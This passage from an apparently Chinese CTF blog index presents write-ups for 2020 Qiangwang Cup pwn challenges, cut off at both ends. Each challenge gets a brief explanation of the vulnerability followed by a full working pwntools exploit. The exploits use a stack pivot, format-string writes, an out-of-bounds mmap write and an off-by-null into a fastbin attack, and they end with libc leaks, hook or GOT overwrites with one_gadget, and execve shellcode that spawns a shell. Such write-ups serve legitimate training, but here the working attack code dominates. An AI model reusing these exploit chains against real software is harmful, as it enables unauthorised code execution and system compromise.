10\t\tmd(10, p64(0) + p64(0x71) + b&#x27;\\xdd\\x25&#x27;)\trm(4)\trm(1)\trm(4)\t# attack to _IO_2_1_stderr + 157\tad(0x60, &#x27;A&#x27;) # 11\tmd(11, &#x27;\\xa0&#x27;)\tad(0x60, &#x27;A&#x27;) # 12\tad(0x60, &#x27;A&#x27;) # 13\tad(0x60, &#x27;A&#x27;) # 14\tad(0x60, &#x27;A&#x27;) # 15\t# leak libc\tp = b&#x27;A&#x27; * 0x33\tp += p64(0xfbad3c80)\tp += p64(0) * 3\tp += p8(8)\tmd(15, p)\t\tleak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)\tlibc_base = leak - (0x7ffff7fc2608 - 0x7ffff7c26000)\tlibc_base = leak - (0x7ffff7dd2608 - 0x7ffff7a0d000) # origin libc 2.23 ubuntu16\tlibc.address = libc_base\t#main_arena = libc_base + 0x39bb20\tone_gadget = libc_base + 0x3f42a\tone_gadget = libc_base + 0xf0364 # original libc 2.23 ubuntu16\tli(&#x27;leak: &#x27; + hex(leak))\tli(&#x27;libc_base: &#x27; + hex(libc_base))\t\t# fastbin attack to malloc_hook - 0x23\trm(5)\trm(6)\trm(5)\tad(0x60, &#x27;A&#x27;) # 16\tp = p64(libc.sym[&#x27;__malloc_hook&#x27;] - 0x23)\tmd(16, p)\tad(0x60, &#x27;A&#x27;) # 17\tad(0x60, &#x27;A&#x27;) # 18\tad(0x60, &#x27;A&#x27;) # 19\tp = b&#x27;A&#x27; * (0x13 - 0x8)\tp += p64(one_gadget)\tp += p64(libc.sym[&#x27;realloc&#x27;] + 8)\tmd(19, p)\t# get shell\tsla(&#x27;&gt;&gt;&#x27;, &#x27;1&#x27;)\tsla(&#x27;question&#x27;, &#x27;80&#x27;)\t#db()\tsla(&#x27;?&#x27;, str(10))def finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path, &quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path&#125;)\t\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n","categories":["ctf"],"tags":["pwn"]},{"title":"wp 2020强网杯","url":"/2020/09/01/security/ctf/compitation/wp-2020-qwb/","content":"2020 强网杯 PWN WP当时做, 做了四道题, wp先贴在这里 \n源题下载: https://github.com/I0gan/pwn/tree/master/matchs/2020_08_qwb\n1-babymessage漏洞 (可以修改rbp 的值) 堆栈迁移使 [rbp - 4 ]&gt; 0x100( mm ), 即可实现堆栈溢出\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0ganfrom pwn import *#from LibcSearcher import LibcSearchercontext.log_level=&#x27;debug&#x27;#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile = &#x27;babymessage&#x27;#libFile = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;libFile = &#x27;./libc-2.27.so&#x27;remoteIp = &quot;123.56.170.202&quot;remotePort = 21342LOCAL = 0LIB   = 1r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(x)db    = lambda   : gdb.attach(io)#--------------------------Exploit--------------------------def exploit():\tleak_fun = &#x27;puts&#x27;\tdp_fun = &#x27;puts&#x27;\tpop_rdi = 0x400ac3\tstart = 0x4006e0\toffset = 0x8\tsla(&#x27;:&#x27;, &#x27;1&#x27;)\tsa(&#x27;:&#x27;, p32(0x101))\tsla(&#x27;:&#x27;, &#x27;2&#x27;)\tsa(&#x27;:&#x27;, &#x27;B&#x27; * 0x8 + p64(0x6010d0 + 4))\tsla(&#x27;:&#x27;, &#x27;2&#x27;)\tru(&#x27;:&#x27;)\tp = &#x27;A&#x27; * offset\tp += p64(0)\tp += p64(pop_rdi)\tp += p64(exe.got[leak_fun])\tp += p64(exe.plt[dp_fun])\tp += p64(start)\t#db()\ts(p)\tleak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + &#x27;\\x7f\\x00\\x00&#x27;)\tli(&#x27;leak &#x27; + hex(leak))\tlibc_base = leak - lib.sym[leak_fun]\tli(&#x27;libc_base &#x27; + hex(libc_base))\tlibc_sys = libc_base + lib.sym[&#x27;system&#x27;]\tlibc_sh = libc_base + 0x00000000001b40fa\tsla(&#x27;:&#x27;, &#x27;1&#x27;)\tsa(&#x27;:&#x27;, p32(0x101))\tsla(&#x27;:&#x27;, &#x27;2&#x27;)\tsa(&#x27;:&#x27;, &#x27;B&#x27; * 0x8 + p64(0x6010d0 + 4))\tsla(&#x27;:&#x27;, &#x27;2&#x27;)\tp = &#x27;A&#x27; * offset\tp += p64(0)\tp += p64(0x400809)\tp += p64(pop_rdi)\tp += p64(libc_sh)\tp += p64(libc_sys)\tp += p64(0)\t#db()\ts(p)def finish():\tia()\tc()#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\texe = ELF(exeFile)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\t\tio = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)\t\telse:\t\t\tio = exe.process()\t\telse:\t\texe = ELF(exeFile)\t\tio = remote(remoteIp, remotePort)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\texploit()\tfinish()\n\n\n\n\n\nsiri格式化字符串漏洞, 泄漏elf_base和libc_base, got表不能修改, 只能先泄漏stack地址, 修改ret地址打one_gadget了,  (已经可以修改ret地址了, 打one_gagdgt 打通了, 不知啥原因, execve函数会跳转到read函数, 导致输入token会出错, 原因: io已经处于shutdown状态)\n另一种劫持,劫持libc中的got表地址, puts函数中存在plt跳转,修改该跳转函数的got地址为one_gadget即可. \nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0ganfrom pwn import *#from LibcSearcher import LibcSearcher#context.log_level=&#x27;debug&#x27;exeFile = &#x27;Siri&#x27;libFile = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;libFile = &#x27;./libc.so.6&#x27;remoteIp = &quot;123.56.170.202&quot;remotePort = 12124LOCAL = 0LIB   = 1r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------#--------------------------Exploit--------------------------def exploit():\tsl(&#x27;Hey Siri!&#x27;)\tp = &#x27;Remind me to &#x27;\tp += &#x27;%1$p, %83$p, %85$p&#x27;\tsa(&#x27;?&#x27;, p)\tru(&#x27;0x&#x27;)\telf_base = int(r(12), 16) - (0x55dde8275033 - 0x55dde8273000)\tli(&#x27;elf_base &#x27; + hex(elf_base))\tru(&#x27;0x&#x27;)\tlibc_base = int(r(12), 16) - lib.sym[&#x27;__libc_start_main&#x27;] - 231\tli(&#x27;libc_base &#x27; + hex(libc_base))\tru(&#x27;0x&#x27;)\ttarget_addr = int(r(12), 16) - (0x7fffb9b2b008 - 0x7fffb9b2af38) - 0x10\ttarget_addr = libc_base + (0x7f667e8880a8 - 0x7f667e49d000)\tli(&#x27;target_addr &#x27; + hex(target_addr))\t\tgadget = [0x4f365, 0x4f3c2, 0x10a45c, 0xe58b8, 0xe58bf, 0xe58c3, 0x10a468]\tone_gadget = libc_base + gadget[5]\t#one_gadget = libc_base + lib.sym[&#x27;system&#x27;]\tl_addr = one_gadget &amp; 0xFFFF\th_addr = (one_gadget &amp; 0xFF0000) &gt;&gt; 16\tli(&#x27;l_addr &#x27; + hex(l_addr))\tli(&#x27;h_addr &#x27; + hex(h_addr))\tsl(&#x27;Hey Siri!&#x27;)\toffset = 14 + 30 + 5\tpre_len = len(&quot;OK, I&#x27;ll remind you to &quot;)\tru(&#x27;?&#x27;)\tp = &#x27;Remind me to &#x27;\tp += &#x27;AAA&#x27; # ajust\tp2 = &#x27;%&#x27;  + str(h_addr - pre_len - 7)  + &#x27;c%&#x27; + str(offset + 4) + &#x27;$hhn&#x27;\tp2 += &#x27;%&#x27;  + str(l_addr - h_addr)  + &#x27;c%&#x27; + str(offset + 5) + &#x27;$hn&#x27;\tif(len(p2) % 8 != 0):\t\twhile(len(p2) % 8 != 0):\t\t\tp2 += &#x27;A&#x27;\tp += p2\tp += p64(target_addr + 2)\tp += p64(target_addr)\tli(&#x27;off &#x27; + str(len(p2) / 8))\t#db()\ts(p)\tli(&#x27;one_gadget &#x27; + hex(one_gadget))\t#p = target_addrdef finish():\tia()\tc()#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\texe = ELF(exeFile)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\t\tio = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)\t\telse:\t\t\tio = exe.process()\t\telse:\t\texe = ELF(exeFile)\t\tio = remote(remoteIp, remotePort)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\texploit()\tfinish()\n\n\n\n3-oldschool题目给了源码和libc, 需要自己编译, 源码如下\n// Ubuntu 18.04, GCC -m32 -O3#include&lt;stdlib.h&gt;#include&lt;stdio.h&gt;#include&lt;unistd.h&gt;#include&lt;sys/mman.h&gt;#include&lt;sys/types.h&gt;#define NUM 0x10#define ADDR_LOW    0xe0000000#define ADDR_HIGH   0xf0000000char* chunks[NUM];unsigned sizes[NUM];int* g_ptr = NULL;void init_io()&#123;    setvbuf(stdin, 0, 2, 0);    setvbuf(stdout, 0, 2, 0);    setvbuf(stderr, 0, 2, 0);&#125;unsigned get_int()&#123;    unsigned res;    if(scanf(&quot;%u&quot;, &amp;res) != 1) exit(0);    return res;&#125;void mmap_delete()&#123;    if(g_ptr != NULL) return;    munmap(g_ptr, 0x1000);    g_ptr = 0;&#125;void mmap_allocate()&#123;    if(g_ptr != NULL) return;    printf(&quot;Where do you want to start: &quot;);    unsigned idx;    idx = get_int();     idx = (idx &gt;&gt; 12) &lt;&lt; 12;    if(idx &gt;= (ADDR_HIGH - ADDR_LOW) ) return;    g_ptr =  mmap(ADDR_LOW + idx, ADDR_HIGH - ADDR_LOW - idx, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);     if(g_ptr != (ADDR_LOW + idx))&#123;        exit(0);    &#125;&#125;void mmap_edit()&#123;    if(g_ptr == NULL)&#123;        printf(&quot;Mmap first!&quot;);        return;    &#125;    unsigned value;    unsigned idx;    printf(&quot;Index: &quot;);    idx = get_int();         if(g_ptr + idx &lt; g_ptr &amp;&amp; (unsigned)(g_ptr + idx) &lt; ADDR_HIGH)&#123; // vul        puts(&quot;Invalid idx&quot;);        return;    &#125;    printf(&quot;Value: &quot;);    value = get_int();     g_ptr[idx] = value;&#125;void allocate()&#123;    unsigned size;    unsigned idx;    printf(&quot;Index: &quot;);    idx = get_int();     if(idx &gt;= NUM || chunks[idx])&#123;        return ;    &#125;    printf(&quot;Size: &quot;);    size = get_int() &amp; 0x1FF;    char* buf = malloc(size);    if(buf == NULL)&#123;        puts(&quot;allocate failed&quot;);        return;    &#125;    chunks[idx] = buf;    sizes[idx] = size;    puts(&quot;Done!&quot;);&#125;void delete()&#123;    unsigned idx;    printf(&quot;Index: &quot;);    idx = get_int();     if(idx &gt;= NUM || chunks[idx] == NULL)&#123;        return ;    &#125;        free(chunks[idx]);    chunks[idx] = NULL;    sizes[idx] = 0;&#125;void show()&#123;    unsigned idx;    printf(&quot;Index: &quot;);    idx = get_int();     if(idx &gt;= NUM || chunks[idx] == NULL)&#123;        return ;    &#125;        printf(&quot;Content: %s\\n&quot;, chunks[idx]);&#125;void readn(char* s, unsigned size)&#123;    for(unsigned i = 0; i &lt; size; i++)&#123;        read(0, s + i, 1);        if(s[i] == &#x27;\\n&#x27;)break;    &#125;&#125;void edit()&#123;    unsigned idx;    printf(&quot;Index: &quot;);    idx = get_int();     if(idx &gt;= NUM || chunks[idx] == NULL)&#123;        return ;    &#125;    printf(&quot;Content: &quot;);     readn(chunks[idx], sizes[idx]);&#125;void menu()&#123;    puts(&quot;1. allocate&quot;);    puts(&quot;2. edit&quot;);    puts(&quot;3. show&quot;);    puts(&quot;4. delete&quot;);    puts(&quot;5. exit&quot;);    printf(&quot;Your choice: &quot;);&#125;int main()&#123;    init_io();    while(1)&#123;        menu();        unsigned choice = get_int();        switch(choice)&#123;            case 1:                allocate();                break;            case 2:                edit();                break;            case 3:                show();                break;            case 4:                delete();                break;            case 5:                exit(0);                break;            case 6:                mmap_allocate();                break;            case 7:                mmap_edit();                break;            case 8:                mmap_delete();                break;            default:                puts(&quot;Unknown&quot;);                break;        &#125;    &#125;    return 0;&#125;\n\n思路先使用堆块布局泄漏libc, 然后通过mmap_edit 中的漏洞实现高地址写入, 修改 exit_hook   \n _rtld_lock_unlock_recursive 为mmap开辟的地址, 然后调用exit时跳转到mmap开辟的地址执行shellcode\nmmap_edit漏洞: \nVulvoid mmap_edit()&#123;    if(g_ptr == NULL)&#123;        printf(&quot;Mmap first!&quot;);        return;    &#125;    unsigned value;    unsigned idx;    printf(&quot;Index: &quot;);    idx = get_int();         if(g_ptr + idx &lt; g_ptr &amp;&amp; (unsigned)(g_ptr + idx) &lt; ADDR_HIGH)&#123; //漏洞        puts(&quot;Invalid idx&quot;);        return;    &#125;    printf(&quot;Value: &quot;);    value = get_int();     g_ptr[idx] = value;&#125;\n\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-from pwn import *#from LibcSearcher import LibcSearchercontext.log_level=&#x27;debug&#x27;#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile = &#x27;pwn&#x27;#libFile = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;libFile = &#x27;./libc-2.27.so&#x27;remoteIp = &quot;0.0.0.0&quot;remotePort = 0LOCAL = 1LIB   = 1r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------def ad(idx, size):\tsla(&#x27;:&#x27;, str(1))\tsla(&#x27;:&#x27;, str(idx))\tsla(&#x27;:&#x27;, str(size))def rm(idx):\tsla(&#x27;:&#x27;, str(4))\tsla(&#x27;:&#x27;, str(idx))def md(idx, data):\tsla(&#x27;:&#x27;, str(2))\tsla(&#x27;:&#x27;, str(idx))\tsa(&#x27;:&#x27;, data)def dp(idx):\tsla(&#x27;:&#x27;, str(3))\tsla(&#x27;:&#x27;, str(idx))def q():\tsla(&#x27;:&#x27;, str(5))\tdef mad(start_addr):\tsla(&#x27;:&#x27;, str(6))\t\tsla(&#x27;:&#x27;, str(start_addr))\tdef mmd(idx, value):\tsla(&#x27;:&#x27;, str(7))\tsla(&#x27;x:&#x27;, str(idx))\tsla(&#x27;e:&#x27;, str(value))def mrm():\tsla(&#x27;:&#x27;, str(8))\tdef m_ad_sc(sc):\twhile(len(sc) % 4 != 0):\t\tsc += &#x27;\\x00&#x27;\tsc_len = len(sc)\tli(&#x27;\\n&#x27;)\tfor i in range(sc_len / 4):\t\tj = i * 4\t\ts = sc[j : j + 4]\t\tn = u32(s)\t\tmmd(i, n)\t\tli(hex(n))\t\t#--------------------------Exploit--------------------------def exploit():\tli(rl())\tad(0, 0x100)\tad(1, 0x100)\trm(0)\trm(1)\tad(0, 0x100)\tdp(0)\tru(&#x27;:&#x27;)\theap_base = u32(ru(&#x27;\\n&#x27;)[-4:]) - 0x160\trm(0)\t# leak libc\tfor i in range(9):\t\tad(i,0x100)\tfor i in range(9):\t\trm(i)\tfor i in range(8):\t\tad(i,0x100)\tmd(7, &#x27;AAA\\n&#x27;)\tdp(7)\tlibc_base = u32(ru(&#x27;\\xf7&#x27;)[-3:] + &#x27;\\xf7&#x27;) - (0xf7f107d8 - 0xf7d38000)\tlibc_got  = libc_base + (0xf7f20000 - 0xf7d48000)\texit_hook = libc_base + 0x209838\t# p _rtld_global\t# _rtld_lock_unlock_recursive\t# _rtld_lock_lock_recursive\tli(&#x27;heap_base :&#x27; + hex(heap_base))\tli(&#x27;libc base: &#x27; + hex(libc_base)) \tli(&#x27;libc got: &#x27; + hex(libc_got)) \tli(&#x27;exit_hook: &#x27; + hex(exit_hook)) \tmad(libc_base &amp; 0xFFFFFFF)\tmidx = (exit_hook - (0xe0000000 + (libc_base &amp; 0xFFFFFFF))) / 4\tmaddr = 0xe0000000 + (libc_base &amp; 0xFFFFFFF)\tli(&#x27;maddr: &#x27; + hex(maddr)) \tli(&#x27;hex &#x27; + hex(midx))\tmmd(midx, maddr)\tsc = &quot;\\x31\\xc9\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc0\\xb0\\x0b\\xcd\\x80&quot;\tm_ad_sc(sc)\t#db()\tq()def finish():\tia()\tc()#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\texe = ELF(exeFile)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\t\tio = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)\t\telse:\t\t\tio = exe.process()\t\telse:\t\texe = ELF(exeFile)\t\tio = remote(remoteIp, remotePort)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\texploit()\tfinish()\n\n\n\n\n\n4-GalgameVulif ( p_addr[atoi((const char *)&amp;buf)] )         &#123;           printf(&quot;movie name &gt;&gt; &quot;, &amp;buf);           v4 = atoi((const char *)&amp;buf); //对v4没有进行溢出检查, 也可以对p_addr附近存在的地址进行写入           read(0, (void *)(p_addr[v4] + 0x60), 0x10uLL);// 溢出8字节漏洞           puts(&quot;\\nHotaru: What a good movie! I like it~\\n&quot;);           puts(&quot;[ You&#x27;ve gained a lot favor of her! ]&quot;);         &#125;\n\n\n\n先通过8字节溢出修改top chunk size, 开辟0x1000不够, 则实现free功能泄漏libc, 在通过v4没有检查漏洞可进行数组越界和退出输入配合实现任意地址写入, 修改libc puts中ABS+0x9dce0plt 跳转的 got表打one_gadget\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0ganfrom pwn import *context.log_level=&#x27;debug&#x27;exeFile = &#x27;Just_a_Galgame&#x27;#libFile = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;libFile = &#x27;./libc.so.6&#x27;remoteIp = &quot;0.0.0.0&quot;remotePort = 0LOCAL = 1LIB   = 1r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------def ad_68():\tsla(&#x27;&gt;&gt;&#x27;, &#x27;1&#x27;)def mv(idx, name):\tsla(&#x27;&gt;&gt;&#x27;, &#x27;2&#x27;)\tsla(&#x27;&gt;&gt;&#x27;, str(idx))\tsa(&#x27;&gt;&gt;&#x27;, name)def ad_1000():\t\tsla(&#x27;&gt;&gt;&#x27;, &#x27;3&#x27;)def dp():\tsla(&#x27;&gt;&gt;&#x27;, &#x27;4&#x27;)def q():\tsla(&#x27;&gt;&gt;&#x27;, &#x27;5&#x27;)\tsa(&#x27;QAQ\\n&#x27;, &#x27;No bye!\\x00&#x27;)#--------------------------Exploit--------------------------def exploit():\tad_68()\tmv(0, &#x27;\\x00&#x27; * 8 + p64(0xd41))\tad_1000()\tad_68()\tdp()\tlibc_base = u64(ru(&#x27;\\x7f&#x27;)[-5:] + &#x27;\\x7f\\x00\\x00&#x27;) - (0x7f70a91f92a0 - 0x7f70a8e0d000)\tli(&#x27;libc_base: &#x27; + hex(libc_base))\tsla(&#x27;&gt;&gt;&#x27;, &#x27;5&#x27;)\ttarget = libc_base + (0x8880a8 - 0x49d000)\tone_gadget = libc_base + 0x4f3c2\tsa(&#x27;QAQ\\n&#x27;, p64(target - 0x60))\tdb()\tmv(8, p64(one_gadget))\tdef finish():\tia()\tc()#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\texe = ELF(exeFile)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\t\tio = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)\t\telse:\t\t\tio = exe.process()\t\telse:\t\texe = ELF(exeFile)\t\tio = remote(remoteIp, remotePort)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\texploit()\tfinish()\n\n\n\neasypwn现在重新复现了下以前没做出来的easypwn, 里面涉及的知识点的确经典….^_^…\n来源2020 强网杯\n难度6 &#x2F; 10\n保护 Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enable\n\n简单描述只有三个功能, 添加, 编辑, 删除, 设置了global_max_fast的大小, 释放内存没法构成fastbin\nunsigned __int64 sub_ACE()&#123;  unsigned __int64 v1; // [rsp+8h] [rbp-8h]  v1 = __readfsqword(0x28u);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  if ( !mallopt(1, 0) )                         // set not malloc as fastbin    exit(-1);  return __readfsqword(0x28u) ^ v1;&#125;\n\n\n\nvulunsigned __int64 __fastcall read_n(__int64 ptr, int size)&#123;  char buf; // [rsp+1Fh] [rbp-11h]  int i; // [rsp+20h] [rbp-10h]  int _i; // [rsp+24h] [rbp-Ch]  unsigned __int64 v6; // [rsp+28h] [rbp-8h]  v6 = __readfsqword(0x28u);  for ( i = -1; ; *(_BYTE *)(ptr + i) = buf )  &#123;    _i = i;    if ( i + 1 &gt;= (unsigned int)(size + 1) )      break;    if ( size - 1 == _i )    &#123;      buf = 0;                                  // vul off by null      *(_BYTE *)(ptr + ++i) = 0;      return __readfsqword(0x28u) ^ v6;    &#125;    if ( (signed int)read(0, &amp;buf, 1uLL) &lt;= 0 )      exit(-1);    if ( buf == 10 )      return __readfsqword(0x28u) ^ v6;    ++i;  &#125;  return __readfsqword(0x28u) ^ v6;&#125;\n\n在输入的函数中存在off by null漏洞\n知识点global_max_fast, unsorted bin attack, fastbin attack, parital write, io file, hook hijack\n思路利用parital write和unsorted bin attack 修改 global_max_fast值为比较大的值, 一般为main_arena + 0x58, 该值一般符合0x7f以内, 所以可以采用该方法恢复, fastbin attack攻击条件, 利用parital write和fastbin attack 打入IO_2_1_stdout, 然后泄漏libc, 最后再利用fastbin attack 打入 malloc_hook - 0x23修改malloc_hook, realloc来调整execve第二个参数, 打通几率  1&#x2F; 16 * 1 &#x2F; 16 &#x3D; 1 &#x2F; 256\nexp#!/usr/bin/env python3#-*- coding:utf-8 -*-# author: i0gan# env: pwndocker [skysider/pwndocker (v: 2020/09/09)]from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;elf_path  = &#x27;./easypwn&#x27;MODIFY_LD = 0arch = &#x27;64&#x27;libc_v = &#x27;2.23&#x27;ld_path   = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/ld-linux-x86-64.so.2&#x27;libs_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib&#x27;libc_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/libc.so.6&#x27;#libc_path = &#x27;./libc.so.6&#x27;#libc_path = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;libc_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/libc.so.6&#x27;# change ld path if(MODIFY_LD):\tos.system(&#x27;cp &#x27; + elf_path + &#x27; &#x27; + elf_path + &#x27;.bk&#x27;)\tchange_ld_cmd = &#x27;patchelf  --set-interpreter &#x27; + ld_path +&#x27; &#x27; + elf_path\tos.system(change_ld_cmd)\tli(&#x27;modify ld ok!&#x27;)\texit(0)# remote server ip and portserver_ip = &quot;0.0.0.0&quot;server_port = 0# if local debugLOCAL = 1LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def ad(size):\tsla(&#x27;:&#x27;, str(1))\tsla(&#x27;:&#x27;, str(size))def rm(idx):\tsla(&#x27;:&#x27;, str(3))\tsla(&#x27;:&#x27;, str(idx))def md(idx, data):\tsla(&#x27;:&#x27;, str(2))\tsla(&#x27;:&#x27;, str(idx))\tsa(&#x27;:&#x27;, data)def q():\tsla(&#x27;:&#x27;, str(5))\t#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tad(0x68) # idx 0\tad(0x88) # idx 1\tad(0x68) # idx 2 f\tad(0xf8) # idx 3\tad(0x68) # idx 4 f\t# for second attack\tad(0x68) # idx 5\tad(0x88) # idx 6\tad(0x68) # idx 7 f\tad(0xf8) # idx 8\tad(0x68) # idx 9 f\tad(0x68) # idx 10 f\trm(1)\tmd(2, b&#x27;A&#x27; * 0x60 + p64(0x100)) #off by null set top chunk pre_inuse bit  as null\t# make chunk 3 merge to chunk 1\trm(3)\tad(0x88) # idx 1\tad(0x68) # idx 3, replace chunk 2, two ptr pointer to same memory\t# modify global_max_fast to make a condition for fastbin attack\t\tad(0x68) # idx 11 -&gt; old chunk 3 \tad(0x88) # idx 12 -&gt; old chunk 3\t\trm(6)\tmd(7, b&#x27;A&#x27; * 0x60 + p64(0x100))\trm(8)  # make chunk 8 merget to chunk 6\tad(0x88) # idx 6 -&gt; old chunk  6\tad(0x68) # idx 8 -&gt; old chunk 7\tad(0xf8) # idx 13 -&gt; old chunk 8\t\t# modify global_max_fast = 0x7f\trm(5) #\trm(3) # -&gt; old chunk 2\t# make bd pointer to main_arena + 8 (global_max_fast - 0x10)\t# 0x7ffff7dd37f8 &lt;global_max_fast&gt;:       0x0000000000000010      0x0000000000000000\tmd(2, p64(0) + b&#x27;\\x38\\x38\\n&#x27;)\t#db()\tad(0x68) # idx 3\tad(0x68) # idx 5\t# unsorted bin attack to modify global_max_fast value as big number(main_arena + 0x58)\trm(3)\t\t# stage 2\trm(11) # -&gt; old chunk 3, for cleanning fastbin\trm(7)  #\tmd(8, &#x27;\\x00\\n&#x27;) # -&gt; chunk 7, make fd -&gt; chunk 2\tmd(2, &#x27;\\xdd\\x25\\n&#x27;)\t\tad(0x68) # idx 3 for ajust\tad(0x68) # idx 7 for ajust\t# attack to _IO_2_1_stderr + 157 to leak libc\tad(0x68) # idx 11\tp = b&#x27;\\x11&#x27; * 0x33\tp += p64(0xfbad3887)\tp += p64(0) * 3\tp += b&#x27;\\x40\\n&#x27;\tmd(11, p)\tleak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)\tlibc_base = leak - (0x7ffff7fc2640 - 0x7ffff7c26000)\tli(&#x27;leak: &#x27; + hex(leak))\tli(&#x27;libc_base: &#x27; + hex(libc_base))\tlibc.address = libc_base\tone_gadget = libc_base + 0x3f42a\t# fastbin attack to malloc_hook - 0x23\trm(2)\trm(10)\trm(5)\tad(0x68) # idx 2\tmd(2, p64(libc.sym[&#x27;__malloc_hook&#x27;] - 0x23) + p64(0) + b&#x27;\\n&#x27;)\tad(0x68) # idx 5\tad(0x68) # idx 10\tad(0x68) # idx 14\tp = b&#x27;\\x00&#x27; * (0x13 - 8)\tp += p64(one_gadget)\tp += p64(libc.sym[&#x27;realloc&#x27;] + 8)\tp += b&#x27;\\n&#x27;\tmd(14, p)\t# get 